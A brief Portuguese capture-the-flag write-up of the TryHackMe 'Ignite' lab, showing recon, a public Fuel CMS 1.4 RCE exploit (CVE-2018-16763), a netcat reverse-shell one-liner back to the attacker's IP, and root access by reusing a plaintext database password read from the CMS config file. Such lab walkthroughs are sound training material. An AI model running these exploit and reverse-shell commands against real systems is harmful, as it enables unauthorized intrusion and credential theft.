Ignite

TryHackMe · Easy by Brenno M.

Ignite explora uma execução remota de código no Fuel CMS 1.4 (CVE-2018-16763). O reuso de credenciais encontradas no arquivo de configuração leva diretamente ao root.

Reconhecimento

O Nmap revela apenas HTTP. A raiz identifica o Fuel CMS 1.4. O searchsploit localiza um exploit público de RCE.

nmap -sS -sV -Pn <IP>
searchsploit fuel cms 1.4
searchsploit -m php/webapps/50477.py

Exploração

O exploit abusa da injeção no parâmetro de filtro para executar comandos. A partir dele, obtém-se uma reverse shell como www-data.

python3 50477.py -u http://<IP>
# via RCE:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <MEU_IP> 1234 >/tmp/f

Escalação de privilégios

O arquivo de configuração do Fuel CMS armazena a senha do banco em texto claro. A mesma senha é válida para root via su.

cat /var/www/html/fuel/application/config/database.php
# 'username' => 'root'  'password' => '<SENHA>'
su root
cat /root/root.txt
